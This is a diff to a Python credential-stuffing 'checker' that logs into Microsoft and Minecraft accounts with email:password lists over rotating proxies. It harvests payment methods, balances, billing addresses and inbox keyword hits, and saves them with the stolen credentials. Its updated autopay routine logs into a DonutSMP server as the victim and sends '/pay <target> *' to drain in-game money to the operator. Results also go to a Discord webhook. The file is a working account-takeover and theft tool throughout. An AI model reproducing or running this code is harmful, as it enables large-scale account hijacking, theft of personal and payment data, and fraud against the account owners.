+    "CA": "Canada", "CANADA": "Canada",
+    "AU": "Australia", "AUSTRALIA": "Australia",
+    "FR": "France", "FRANCE": "France",
+    "IT": "Italy", "ITALY": "Italy",
+    "ES": "Spain", "SPAIN": "Spain",
+    "BR": "Brazil", "BRAZIL": "Brazil",
+    "JP": "Japan", "JAPAN": "Japan",
+    "KR": "South_Korea", "KOREA": "South_Korea",
+    "CN": "China", "CHINA": "China",
+    "RU": "Russia", "RUSSIA": "Russia",
+    "MX": "Mexico", "MEXICO": "Mexico",
+    "NL": "Netherlands", "NETHERLANDS": "Netherlands",
+    "SE": "Sweden", "SWEDEN": "Sweden",
+    "NO": "Norway", "NORWAY": "Norway",
+    "DK": "Denmark", "DENMARK": "Denmark",
+    "FI": "Finland", "FINLAND": "Finland",
+    "PL": "Poland", "POLAND": "Poland",
+    "TR": "Turkey", "TURKEY": "Turkey", "TURKIYE": "Turkey",
+    "SA": "Saudi_Arabia", "SAUDI ARABIA": "Saudi_Arabia",
+    "AE": "United_Arab_Emirates", "UAE": "United_Arab_Emirates",
+    "SG": "Singapore", "SINGAPORE": "Singapore",
+    "MY": "Malaysia", "MALAYSIA": "Malaysia",
+    "ID": "Indonesia", "INDONESIA": "Indonesia",
+    "TH": "Thailand", "THAILAND": "Thailand",
+    "VN": "Vietnam", "VIETNAM": "Vietnam",
+    "PH": "Philippines", "PHILIPPINES": "Philippines",
+    "AR": "Argentina", "ARGENTINA": "Argentina",
+    "CL": "Chile", "CHILE": "Chile",
+    "ZA": "South_Africa", "SOUTH AFRICA": "South_Africa",
+    "NZ": "New_Zealand", "NEW ZEALAND": "New_Zealand",
+    "IE": "Ireland", "IRELAND": "Ireland",
+    "CH": "Switzerland", "SWITZERLAND": "Switzerland",
+    "AT": "Austria", "AUSTRIA": "Austria",
+    "BE": "Belgium", "BELGIUM": "Belgium",
+    "PT": "Portugal", "PORTUGAL": "Portugal",
+    "GR": "Greece", "GREECE": "Greece",
+    "CZ": "Czech_Republic", "CZECH REPUBLIC": "Czech_Republic",
+    "HU": "Hungary", "HUNGARY": "Hungary",
+    "RO": "Romania", "ROMANIA": "Romania",
+    "UA": "Ukraine", "UKRAINE": "Ukraine",
+    "IL": "Israel", "ISRAEL": "Israel"
+}
+
+def format_country_name(raw_country):
+    if not raw_country or raw_country == "Unknown":
+        return "Unknown"
+    cleaned = str(raw_country).strip().upper()
+    if cleaned in COUNTRY_NAMES:
+        return COUNTRY_NAMES[cleaned]
+    words = re.split(r'[\s_]+', str(raw_country).strip())
+    clean_words = ["".join([c for c in w if c.isalnum()]) for w in words if w]
+    if clean_words:
+        return "_".join([w.capitalize() for w in clean_words])
+    return "Unknown"
 
 def check_microsoft_account(session, email, password, config, fname):
     try:
@@ -792,7 +1089,8 @@ def check_microsoft_account(session, email, password, config, fname):
                     try:
                         amount_str = re.sub('[^\\d\\.]', '', str(balance))
                         if amount_str and float(amount_str) > 0:
-                            write_dedupe(fname, 'Microsoft_Balance.txt', f'{email}:{password} | Balance: {balance}\n')
+                            bal_line = f'{email}:{password} | Balance: {balance}\n'
+                            write_dedupe(fname, 'balance.txt', bal_line)
                             return ('balance', balance)
                     except Exception:
                         pass
@@ -801,13 +1099,16 @@ def check_microsoft_account(session, email, password, config, fname):
             if config.get('check_rewards_points', True):
                 points = checker.check_rewards_points()
                 if points:
-                    write_dedupe(fname, 'Ms_Points.txt', f'{email}:{password} | Points: {points}\n')
+                    pts_line = f'{email}:{password} | Points: {points}\n'
+                    write_dedupe(fname, 'point.txt', pts_line)
                     return ('rewards_points', points)
             return None
         def check_payment():
             if config.get('check_payment_methods') or config.get('check_credit_cards') or config.get('check_paypal'):
                 instruments = checker.check_payment_instruments()
                 if instruments:
+                    card_line = f"{email}:{password} | {'; '.join(instruments)}\n"
+                    write_dedupe(fname, 'payment.txt', card_line)
                     return ('payment_methods', instruments)
             return None
         def check_subs():
@@ -836,43 +1137,51 @@ def check_microsoft_account(session, email, password, config, fname):
                     return ('billing_addresses', addresses)
             return None
         def check_inbox():
-            if config.get('scan_inbox'):
+            if config.get('scan_inbox', True):
                 keywords_str = config.get('inbox_keywords', '')
-                if keywords_str:
+                if keywords_str and isinstance(keywords_str, str) and keywords_str.strip():
                     keywords = [k.strip() for k in keywords_str.split(',') if k.strip()]
-                    inbox_results = checker.check_inbox(keywords)
-                    if inbox_results:
-                        inbox_dir = os.path.join('results', fname, 'Inboxes')
-                        os.makedirs(inbox_dir, exist_ok=True)
-                        for keyword, match_count in inbox_results:
-                            if match_count and (isinstance(match_count, int) and match_count > 0 or match_count != 0):
-                                safe_keyword = "".join([c for c in str(keyword) if c.isalpha() or c.isdigit() or c==' ']).rstrip()
-                                write_dedupe(fname, f'Inboxes/{safe_keyword}.txt', f'{email}:{password}\n')
-                        formatted_results = ', '.join([f'{k} {v}' for k, v in inbox_results])
-                        write_dedupe(fname, 'inboxes_summary.txt', f'{email}:{password} | Inbox - {formatted_results}\n')
-                        return ('inbox_results', inbox_results)
+                else:
+                    keywords = ["steam", "netflix", "Crunchyroll", "discord", "microsoft", "nordvpn"]
+                inbox_results = checker.check_inbox(keywords)
+                if inbox_results:
+                    for keyword, match_count in inbox_results:
+                        if match_count and int(match_count) > 0:
+                            clean_kw = "".join([c for c in str(keyword) if c.isalnum() or c in (' ', '_', '-')]).strip()
+                            safe_keyword = clean_kw.title().replace(' ', '_') if clean_kw else "Search_Hit"
+                            write_dedupe(fname, f'Inboxes/{safe_keyword}.txt', f'{email}:{password}\n')
+                    formatted_results = ', '.join([f'{k} ({v})' for k, v in inbox_results])
+                    write_dedupe(fname, 'Inbox.txt', f'{email}:{password} | Inbox - {formatted_results}\n')
+                    return ('inbox_results', inbox_results)
             return None
 
         try:
-            check_balance()
+            r = check_balance()
+            if r: results[r[0]] = r[1]
         except: pass
         try:
-            check_rewards()
+            r = check_rewards()
+            if r: results[r[0]] = r[1]
         except: pass
         try:
-            check_payment()
+            r = check_payment()
+            if r: results[r[0]] = r[1]
         except: pass
         try:
-            check_subs()
+            r = check_subs()
+            if r: results[r[0]] = r[1]
         except: pass
         try:
-            check_orders()
+            r = check_orders()
+            if r: results[r[0]] = r[1]
         except: pass
         try:
-            check_billing()
+            r = check_billing()
+            if r: results[r[0]] = r[1]
         except: pass
         try:
-            check_inbox()
+            r = check_inbox()
+            if r: results[r[0]] = r[1]
         except: pass
         
         return results
@@ -908,7 +1217,7 @@ class ConfigLoader:
             self.create_default_config()
             return False
     def create_default_config(self):
-        self.settings = {'max_retries': 4, 'timeout': 15, 'threads': 100, 'use_proxies': False, 'check_xbox_game_pass': True, 'check_minecraft_ownership': True, 'check_hypixel_rank': True, 'check_payment': False, 'auto_proxy': False, 'proxy_api': '', 'request_num': 3, 'proxy_time': 5, 'check_microsoft_balance': False, 'check_rewards_points': False, 'check_payment_methods': False, 'check_subscriptions': False, 'check_orders': False, 'check_billing_address': False, 'scan_inbox': False, 'save_bad': False, 'inbox_keywords': 'Microsoft,Steam,Xbox,Game Pass,Purchase,Order,Confirmation,Receipt,Payment'}
+        self.settings = {'max_retries': 4, 'timeout': 15, 'threads': 100, 'use_proxies': False, 'check_xbox_game_pass': True, 'check_minecraft_ownership': True, 'check_hypixel_rank': True, 'check_payment': False, 'auto_proxy': False, 'proxy_api': '', 'request_num': 3, 'proxy_time': 5, 'check_microsoft_balance': False, 'check_rewards_points': False, 'check_payment_methods': False, 'check_subscriptions': False, 'check_orders': False, 'check_billing_address': False, 'scan_inbox': True, 'save_bad': False, 'inbox_keywords': 'Microsoft,Steam,Xbox,Game Pass,Purchase,Order,Confirmation,Receipt,Payment'}
         self.config = configparser.ConfigParser()
         self.update_config_schema()
         print(f'{Fore.GREEN}✓ Created default configuration file: {self.config_file}{Fore.RESET}')
@@ -965,7 +1274,7 @@ class ConfigLoader:
                 'check_two_factor': 'True'
             },
             'Inbox': {
-                'scan_inbox': 'False',
+                'scan_inbox': 'True',
                 'inbox_keywords': 'steam, netflix, Crunchyroll',
                 'max_inbox_messages': '50',
                 'save_full_emails': 'False'
@@ -1134,6 +1443,7 @@ api_socks4 = ['https://api.proxyscrape.com/v3/free-proxy-list/get?request=getpro
 api_socks5 = ['https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text', 'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt', 'https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt', 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt']
 api_http = ['https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt', 'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt']
 hits, bad, twofa, cpm, cpm1, errors, retries, checked, vm, sfa, mfa, maxretries, xgp, xgpu, other, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, automarklost = (0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0)
+autopay_count = 0
 stats_lock = threading.Lock()
 urllib3.disable_warnings()
 warnings.filterwarnings('ignore')
@@ -1144,6 +1454,13 @@ def is_no_proxy():
 class Config:
     def __init__(self):
         self.data = {}
+        try:
+            cfg = ConfigLoader('config.ini')
+            cfg.parse_all_sections()
+            for k, v in cfg.settings.items():
+                self.data[k] = v
+        except Exception:
+            pass
     def set(self, key, value):
         self.data[key] = value
     def get(self, key, default=None):
@@ -1177,6 +1494,11 @@ class Capture:
         self.ms_payment_methods = []
         self.inbox_matches = []
         self.ban_checked = False
+        self.country = 'Unknown'
+        self.sbnetworth = None
+        self.swstars = None
+        self.pitcoins = None
+        self.dungeons = None
     def builder(self, mask_password=False, include_timestamp=False):
         if self.banned is None:
             ban_status = '[Unknown]'
@@ -1317,25 +1639,12 @@ class Capture:
                             self.bwstars = match.group()
                 except:
                     pass
-            if False and config.get('hypixelsbcoins'):
-                try:
-                    req = self.session.get('https://sky.shiiyu.moe/stats/' + self.name, proxies=getproxy() if not is_no_proxy() else None, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}, verify=False, timeout=(5, 8))
-                    if req.status_code == 200:
-                        match = SB_NETWORTH.search(req.text)
-                        if match:
-                            self.sbcoins = match.group()
-                        else:
-                            self.sbcoins = 'N/A'
-                    else:
-                        self.sbcoins = 'N/A'
-                except:
-                    self.sbcoins = 'N/A'
         except:
             errors += 1
     def optifine(self):
         if config.get('optifinecape') and config.get('optifine_cape', True):
             try:
-                txt = self.session.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy() if not is_no_proxy() else None, verify=False, timeout=8).text
+                txt = self.session.get(f'https://optifine.net/capes/{self.name}.png', proxies=getproxy() if not is_no_proxy() else None, verify=False, timeout=8).text
                 if 'Not found' in txt:
                     self.cape = 'No'
                 else:
@@ -1375,14 +1684,16 @@ class Capture:
                     mfa += 1
                     if config.get('mark_mfa', True):
                         rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
-                        with file_lock:
-                            with open(f'results/{fname}/MFA.txt', 'a', encoding='utf-8') as f:
-                                 f.write(f'{self.email}:{self.password}{rank_str}\n')
-                except imaplib.IMAP4.error:
-                    sfa += 1
-                    self.access = 'False'
-                    if config.get('mark_sfa', True):
-                        write_dedupe(fname, 'SFA.txt', f'{self.email}:{self.password}\n')
+                        write_dedupe(fname, 'MFA.txt', f'{self.email}:{self.password}{rank_str}\n')
+                except imaplib.IMAP4.error as e:
+                    err_msg = str(e).lower()
+                    if any(k in err_msg for k in ['authentication failed', 'invalid credentials', 'login failed', '[authenticationfailed]']):
+                        sfa += 1
+                        self.access = 'False'
+                        if config.get('mark_sfa', True):
+                            write_dedupe(fname, 'SFA.txt', f'{self.email}:{self.password}\n')
+                    else:
+                        self.access = 'Unknown'
                 except Exception as e:
                     self.access = 'Unknown'
             except:
@@ -1429,6 +1740,17 @@ class Capture:
                 except:
                     pass
                 tries += 1
+    def check_country(self):
+
+        country = 'Unknown'
+        try:
+            ms_checker = MicrosoftChecker(self.session, self.email, self.password, config, fname)
+            country = ms_checker.check_country()
+        except Exception:
+            pass
+        if country and country != 'Unknown':
+            self.country = country
+        return country
     def check_donut_smp(self):
         if not config.get('donut_stats', True):
             return
@@ -1438,67 +1760,36 @@ class Capture:
             return
         try:
             donut_api_url = DONUT_API_URL
-            donut_api_key = config.get('donut_api_key')
+            donut_api_key = config.get('donut_api_key', '')
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': 'application/json'}
             if donut_api_key:
                 headers['Authorization'] = f'Bearer {donut_api_key}'
+                headers['x-api-key'] = str(donut_api_key)
+
             try:
                 proxy_config = getproxy() if proxytype != "'4'" else None
             except Exception:
                 proxy_config = None
-                if UI_ENABLED and ui:
-                    ui.log_info('Donut SMP: Proxy error, trying without proxy')
-            session = requests.Session()
-            retries = Retry(total=3, backoff_factor=0.75, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=['GET'], respect_retry_after_header=True, raise_on_status=False)
-            adapter = HTTPAdapter(max_retries=retries)
-            session.mount('https://', adapter)
-            session.mount('http://', adapter)
-            proxy_candidates = []
-            if proxytype != "'4'":
-                try:
-                    for _ in range(4):
-                        p = getproxy()
-                        if p:
-                            proxy_candidates.append(p)
-                except Exception:
-                    pass
-            unique = []
-            seen = set()
-            for p in proxy_candidates:
-                key = str(p)
-                if key not in seen:
-                    seen.add(key)
-                    unique.append(p)
-            proxy_candidates = unique + [None]
-            valid_proxies = []
-            for p in proxy_candidates:
-                try:
-                    r = session.get('https://api.donutsmp.net/index.html', headers=headers, proxies=p, verify=False, timeout=10)
-                    if r.status_code == 200:
-                        valid_proxies.append(p)
-                    elif UI_ENABLED and ui:
-                        ui.log_info(f"Donut SMP: preflight {r.status_code}{(' (no proxy)' if p is None else '')}")
-                except Exception as e:
-                    if UI_ENABLED and ui:
-                        ui.log_info(f"Donut SMP: preflight failed {('(no proxy)' if p is None else '')} - {e.__class__.__name__}: {str(e)[:160]}")
-            if not valid_proxies:
-                valid_proxies = [None]
             response = None
-            for idx, p in enumerate(valid_proxies):
+            for _attempt in range(3):
                 try:
-                    r = session.get(f'{donut_api_url}{self.name}', headers=headers, proxies=p, verify=False, timeout=20)
-                    time.sleep(0.3 * (idx + 1))
-                    if r.status_code == 200 or r.status_code in (401, 404, 429):
+                    r = self.session.get(f'{donut_api_url}{self.name}', headers=headers,
+                                         proxies=proxy_config, verify=False, timeout=12)
+                    if r.status_code in (200, 401, 404, 429):
                         response = r
                         break
-                    else:
+                    elif r.status_code >= 500:
                         if UI_ENABLED and ui:
-                            ui.log_info(f"Donut SMP: server error {r.status_code} on attempt {idx + 1}{(' (no proxy)' if p is None else '')}")
+                            ui.log_info(f'Donut SMP: server error {r.status_code} attempt {_attempt+1}')
                         continue
-                except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.RetryError, requests.exceptions.ProxyError, requests.exceptions.SSLError, requests.exceptions.InvalidSchema) as e:
+                except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                     if UI_ENABLED and ui:
-                        ui.log_info(f"Donut SMP: connection failed on attempt {idx + 1}{(' (no proxy)' if p is None else '')} - {e.__class__.__name__}: {str(e)[:160]}")
+                        ui.log_info(f'Donut SMP: connection failed attempt {_attempt+1} - {e.__class__.__name__}')
+
+                    proxy_config = None
                     continue
+                except Exception:
+                    break
             if response is None:
                 if UI_ENABLED and ui:
                     ui.log_info('Donut SMP API: Connection failed after retries')
@@ -1516,47 +1807,24 @@ class Capture:
                     stats_lines = []
                     stats_lines.append(f'{self.email}:{self.password}')
                     stats_lines.append(f'Username: {self.name}')
-                    if stats_data.get('broken_blocks'):
-                        stats_lines.append(f"broken_blocks: {stats_data['broken_blocks']}")
-                    if stats_data.get('deaths'):
-                        stats_lines.append(f"deaths: {stats_data['deaths']}")
-                    if stats_data.get('kills'):
-                        stats_lines.append(f"kills: {stats_data['kills']}")
-                    if stats_data.get('mobs_killed'):
-                        stats_lines.append(f"mobs_killed: {stats_data['mobs_killed']}")
-                    if stats_data.get('money'):
-                        stats_lines.append(f"money: {stats_data['money']}")
-                    if stats_data.get('money_made_from_sell'):
-                        stats_lines.append(f"money_made_from_sell: {stats_data['money_made_from_sell']}")
-                    if stats_data.get('money_spent_on_shop'):
-                        stats_lines.append(f"money_spent_on_shop: {stats_data['money_spent_on_shop']}")
-                    if stats_data.get('placed_blocks'):
-                        stats_lines.append(f"placed_blocks: {stats_data['placed_blocks']}")
-                    if stats_data.get('playtime'):
-                        try:
-                            raw_playtime = stats_data['playtime']
-                            formatted_playtime = self._format_seconds(raw_playtime)
-                            stats_lines.append(f'playtime: {raw_playtime} ({formatted_playtime})')
-                        except Exception:
-                            stats_lines.append(f"playtime: {stats_data['playtime']}")
-                    if self.banned is not None:
-                        if self.banned and self.banned != 'False':
-                            stats_lines.append('banned: true')
-                            if self.banned not in ('True', 'true', True):
-                                ban_info = self._parse_ban_info(self.banned)
-                                if ban_info.get('ban_id'):
-                                    stats_lines.append(f"ban_id: {ban_info['ban_id']}")
-                                if ban_info.get('duration'):
-                                    stats_lines.append(f"ban_duration: {ban_info['duration']}")
+                    for key in ('broken_blocks', 'deaths', 'kills', 'mobs_killed', 'money', 'money_made_from_sell', 'money_spent_on_shop', 'placed_blocks', 'playtime'):
+                        val = stats_data.get(key)
+                        if val is not None:
+                            if key == 'playtime':
+                                try:
+                                    stats_lines.append(f'playtime: {val} ({self._format_seconds(val)})')
+                                except Exception:
+                                    stats_lines.append(f'playtime: {val}')
                             else:
-                                stats_lines.append('ban_duration: Unknown')
+                                stats_lines.append(f'{key}: {val}')
+                    if self.banned is not None:
+                        if self.banned and self.banned != 'False' and not str(self.banned).startswith('[Error]') and not str(self.banned).startswith('[Unchecked]'):
+                            stats_lines.append('banned: true')
                         else:
                             stats_lines.append('banned: false')
-                    if len(stats_lines) > 2:
-                        with file_lock:
-                            with open(f'results/{fname}/donut_stats.txt', 'a', encoding='utf-8') as f:
-                                f.write('\n'.join(stats_lines))
-                                f.write('\n' + '=' * 50 + '\n')
+                    if len(stats_lines) >= 2:
+                        stats_content = '\n'.join(stats_lines) + '\n' + '=' * 50 + '\n'
+                        write_dedupe(fname, 'donut_stats.txt', stats_content)
                         if UI_ENABLED and ui:
                             ui.log_info(f'Donut SMP stats saved for {self.name}')
             elif response.status_code == 404:
@@ -1568,15 +1836,6 @@ class Capture:
             elif response.status_code == 429:
                 if UI_ENABLED and ui:
                     ui.log_info('Donut SMP API: Rate limited')
-        except requests.exceptions.RequestException as e:
-            if 'Max retries exceeded' in str(e):
-                if UI_ENABLED and ui:
-                    ui.log_info('Donut SMP API: Connection failed after retries')
-            elif 'Connection' in str(e) or 'Timeout' in str(e):
-                if UI_ENABLED and ui:
-                    ui.log_info('Donut SMP API: Connection timeout')
-            elif UI_ENABLED and ui:
-                ui.log_info('Donut SMP API: Request failed')
         except Exception as e:
             if UI_ENABLED and ui:
                 ui.log_info(f'Donut SMP error: {str(e)[:100]}')
@@ -1587,54 +1846,62 @@ class Capture:
         if not config.get('donutsmp_autopay', False):
             return
         pay_target = config.get('donutsmp_pay_username', '')
-        if not pay_target or pay_target == 'YOUR_USERNAME':
+        if not pay_target or pay_target in ('YOUR_USERNAME', ''):
+            return
+        if not self.name or self.name == 'N/A':
             return
         def _do_autopay():
+            connection = None
             try:
                 auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
                 auth_token.profile = Profile(id_=self.uuid, name=self.name)
-                connection = Connection('play.donutsmp.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={'1.8', 47})
+                server_host = config.get('donutsmp_server', 'east.donutsmp.net')
+                try:
+                    socket.gethostbyname(server_host)
+                except (socket.gaierror, Exception):
+                    server_host = 'east.donutsmp.net'
+                connection = Connection(server_host, 25565, auth_token=auth_token, initial_version=47, allowed_versions={47})
 
                 @connection.listener(clientbound_play.JoinGamePacket)
                 def on_join(packet):
                     def delayed_pay():
-                        time.sleep(2.0)
-                        if UI_ENABLED and ui:
-                            ui.log_info(f"Donut SMP: Sending /pay {pay_target} * from {self.name}")
-                        chat = ChatPacket(message=f"/pay {pay_target} *")
-                        connection.write_packet(chat)
-                        time.sleep(1.0)
-                        connection.disconnect()
+                        try:
+                            time.sleep(1.5)
+                            if UI_ENABLED and ui:
+                                ui.log_info(f"Donut SMP: Sending /pay {pay_target} * from {self.name}")
+                            chat = ChatPacket(message=f"/pay {pay_target} *")
+                            connection.write_packet(chat)
+                            with stats_lock:
+                                global autopay_count
+                                autopay_count += 1
+                            write_dedupe(fname, 'donutsmp_autopay.txt', f'{self.email}:{self.password} | Sent /pay {pay_target} * (Name: {self.name})\n')
+                            time.sleep(0.5)
+                            if UI_ENABLED and ui:
+                                ui.log_info(f"Donut SMP: AutoPay sent for {self.name}")
+                            connection.disconnect()
+                        except Exception:
+                            pass
                     threading.Thread(target=delayed_pay, daemon=True).start()
 
                 @connection.listener(clientbound_login.DisconnectPacket)
                 def on_disconnect_login(packet):
                     pass
-                    
+
                 @connection.listener(clientbound_play.DisconnectPacket)
                 def on_disconnect_play(packet):
                     pass
 
                 connection.connect()
-                time.sleep(8)
-                if getattr(connection, 'networking_thread', None):
-                    connection.disconnect()
+                time.sleep(1.5)
+                if connection and getattr(connection, 'networking_thread', None):
+                    try:
+                        connection.disconnect()
+                    except Exception:
+                        pass
             except Exception as e:
                 if UI_ENABLED and ui:
                     ui.log_error(f"DonutSMP Autopay error: {str(e)[:50]}")
         threading.Thread(target=_do_autopay, daemon=True).start()
-    def check_microsoft_features(self):
-        global retries
-        try:
-            if config.get('check_microsoft_balance') or config.get('check_rewards_points', True) or config.get('check_payment_methods') or config.get('check_subscriptions') or config.get('check_orders') or config.get('check_billing_address') or config.get('scan_inbox'):
-                results = check_microsoft_account(self.session, self.email, self.password, config, fname)
-                self.ms_balance = results.get('balance')
-                self.ms_rewards = results.get('rewards_points')
-                self.ms_payment_methods = results.get('payment_methods', [])
-                self.ms_orders = results.get('orders', [])
-                self.inbox_matches = results.get('inbox_results', [])
-        except Exception as e:
-            retries += 1
     def ban(self, session):
         global errors
         if not MINECRAFT_AVAILABLE:
@@ -1651,7 +1918,7 @@ class Capture:
             auth_token.profile = Profile(id_=self.uuid, name=self.name)
             tries = 0
             while tries < maxretries:
-                connection = Connection('mc.hypixel.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={'1.8', 47})
+                connection = Connection('mc.hypixel.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={47})
                 
                 original_handle_exception = connection._handle_exception
                 def safe_handle_exception(e, exc_info):
@@ -1800,7 +2067,7 @@ class Capture:
 
                         connected = True
                         c = 0
-                        while self.banned == None and c < 3000:
+                        while self.banned == None and c < 600:
                             time.sleep(0.01)
                             c += 1
                         connection.disconnect()
@@ -1985,6 +2252,88 @@ class Capture:
         except Exception as e:
             if UI_ENABLED and ui:
                 ui.log_error(f'Failed to save capture: {str(e)[:50]}')
+
+    def check_microsoft_features(self):
+        try:
+            checker = MicrosoftChecker(self.session, self.email, self.password, config, fname)
+
+            try:
+                keywords_str = config.get('inbox_keywords', '')
+                if keywords_str and isinstance(keywords_str, str) and keywords_str.strip():
+                    keywords = [k.strip() for k in keywords_str.split(',') if k.strip()]
+                else:
+                    keywords = ["steam", "netflix", "Crunchyroll", "discord", "microsoft", "nordvpn", "paypal", "roblox", "epic games", "spotify", "playstation", "xbox"]
+                inbox_res = checker.check_inbox(keywords)
+                if inbox_res:
+                    self.inbox_matches = [f'{k} ({v})' for k, v in inbox_res]
+                    for keyword, match_count in inbox_res:
+                        if match_count and int(match_count) > 0:
+                            clean_kw = "".join([c for c in str(keyword) if c.isalnum() or c in (' ', '_', '-')]).strip()
+                            safe_keyword = clean_kw.title().replace(' ', '_') if clean_kw else "Search_Hit"
+                            write_dedupe(fname, f'Inboxes/{safe_keyword}.txt', f'{self.email}:{self.password}\n')
+                    formatted_results = ', '.join(self.inbox_matches)
+                    write_dedupe(fname, 'Inbox.txt', f'{self.email}:{self.password} | Inbox - {formatted_results}\n')
+            except Exception as e:
+                if UI_ENABLED and ui:
+                    ui.log_error(f"MC Inbox Check error: {str(e)[:50]}")
+
+            try:
+                p_inst = checker.check_payment_instruments()
+                if p_inst:
+                    self.ms_payment_methods = p_inst
+                    card_line = f"{self.email}:{self.password} | {'; '.join(p_inst)}\n"
+                    write_dedupe(fname, 'payment.txt', card_line)
+            except Exception as e:
+                if UI_ENABLED and ui:
+                    ui.log_error(f"MC Payment Check error: {str(e)[:50]}")
+
+            try:
+                if config.get('check_microsoft_balance'):
+                    bal = checker.check_balance()
+                    if bal:
+                        self.ms_balance = bal
+                        amount_str = re.sub(r'[^\d\.]', '', str(bal))
+                        if amount_str and float(amount_str) > 0:
+                            bal_line = f'{self.email}:{self.password} | Balance: {bal}\n'
+                            write_dedupe(fname, 'balance.txt', bal_line)
+            except Exception as e:
+                if UI_ENABLED and ui:
+                    ui.log_error(f"MC Balance Check error: {str(e)[:50]}")
+
+            try:
+                if config.get('check_rewards_points', True):
+                    pts = checker.check_rewards_points()
+                    if pts:
+                        self.ms_rewards = pts
+                        pts_line = f'{self.email}:{self.password} | Points: {pts}\n'
+                        write_dedupe(fname, 'point.txt', pts_line)
+            except Exception as e:
+                if UI_ENABLED and ui:
+                    ui.log_error(f"MC Rewards Check error: {str(e)[:50]}")
+
+            try:
+                if config.get('check_subscriptions'):
+                    subs = checker.check_subscriptions()
+                    if subs:
+                        self.ms_subscriptions = subs
+                        write_dedupe(fname, 'Subscriptions.txt', f"{self.email}:{self.password} | Subs: {', '.join(subs)}\n")
+            except Exception as e:
+                if UI_ENABLED and ui:
+                    ui.log_error(f"MC Subscriptions Check error: {str(e)[:50]}")
+
+            try:
+                if config.get('check_billing_address'):
+                    addrs = checker.check_billing_address()
+                    if addrs:
+                        self.ms_billing_addresses = addrs
+                        write_dedupe(fname, 'Billing_Addresses.txt', f"{self.email}:{self.password} | Address: {'; '.join(addrs)}\n")
+            except Exception as e:
+                if UI_ENABLED and ui:
+                    ui.log_error(f"MC Billing Check error: {str(e)[:50]}")
+        except Exception as e:
+            if UI_ENABLED and ui:
+                ui.log_error(f"MC Features error: {str(e)[:50]}")
+
     def handle(self, session):
         global hits, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, errors
 
@@ -2000,27 +2349,30 @@ class Capture:
             global minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, errors
             if self.name and self.name != 'N/A':
                 try: self.hypixel()
-                except Exception: errors += 1
+                except Exception: pass
                 try:
                     self.optifine()
                     if self.cape == 'Yes': optifine_capes += 1
-                except Exception: errors += 1
+                except Exception: pass
                 if self.capes and self.capes != '': minecraft_capes += 1
                 try: self.full_access()
-                except Exception: errors += 1
+                except Exception: pass
                 try:
                     self.namechange()
                     if self.namechange_available: name_changes += 1
-                except Exception: errors += 1
+                except Exception: pass
                 try: self.ban(session)
                 except Exception as e:
                     self.banned = f'[Error] Ban execution: {e}'
-                    errors += 1
+                try:
+                    self.check_country()
+                except Exception:
+                    pass
                 try:
                     self.check_microsoft_features()
                     if self.ms_payment_methods: payment_methods += len(self.ms_payment_methods)
                     if self.inbox_matches: inbox_matches += len(self.inbox_matches)
-                except Exception: errors += 1
+                except Exception: pass
                 if config.get('setname'):
                     try: self.setname()
                     except Exception: pass
@@ -2031,13 +2383,11 @@ class Capture:
                     self.check_microsoft_features()
                     if self.ms_payment_methods: payment_methods += len(self.ms_payment_methods)
                     if self.inbox_matches: inbox_matches += len(self.inbox_matches)
-                except Exception: errors += 1
+                except Exception: pass
                 try: self.setname()
                 except Exception: pass
-            def _launch_donut():
-                try: self.check_donut_smp()
-                except Exception: pass
-            threading.Thread(target=_launch_donut, daemon=True).start()
+            try: self.check_donut_smp()
+            except Exception: pass
             try: self.autopay_donutsmp()
             except Exception: pass
             if config.get('setskin'):
@@ -2065,19 +2415,22 @@ class Capture:
             except Exception:
                 stats_text = None
             try:
-                with file_lock:
-                    open(f'results/{fname}/Capture.txt', 'a').write(fullcapt + '\n')
-                    if self.namechange_available:
-                        open(f'results/{fname}/Namechangeable.txt', 'a').write(fullcapt + '\n')
-                    if self.banned == 'False':
-                        open(f'results/{fname}/Unbanned.txt', 'a').write(fullcapt + '\n')
-                    elif self.banned and not str(self.banned).startswith('[Error]') and not str(self.banned).startswith('[Unchecked]') and self.banned != 'Unknown':
-                        open(f'results/{fname}/Banned.txt', 'a').write(fullcapt + '\n')
+                write_dedupe(fname, 'Capture.txt', fullcapt + '\n')
+                if self.namechange_available:
+                    write_dedupe(fname, 'Namechangeable.txt', fullcapt + '\n')
+                if self.banned == 'False':
+                    write_dedupe(fname, 'Unbanned.txt', fullcapt + '\n')
+                elif self.banned and not str(self.banned).startswith('[Error]') and not str(self.banned).startswith('[Unchecked]') and self.banned != 'Unknown':
+                    write_dedupe(fname, 'Banned.txt', fullcapt + '\n')
             except: pass
             if UI_ENABLED and ui:
                 ui.log_hit_formatted(self, stats_text, precomputed_line=masked_capt)
-        threading.Thread(target=_enrich, daemon=False).start()
-        self.send_discord_webhook()
+
+        threading.Thread(target=_enrich, daemon=True).start()
+        try:
+            self.send_discord_webhook()
+        except Exception:
+            pass
     def send_discord_webhook(self):
         try:
             enable_notifications = config.get('enable_notifications')
@@ -2174,9 +2527,6 @@ class Capture:
                     ui.log_error(f'✗ Webhook URL not found - check config.ini')
             elif UI_ENABLED and ui:
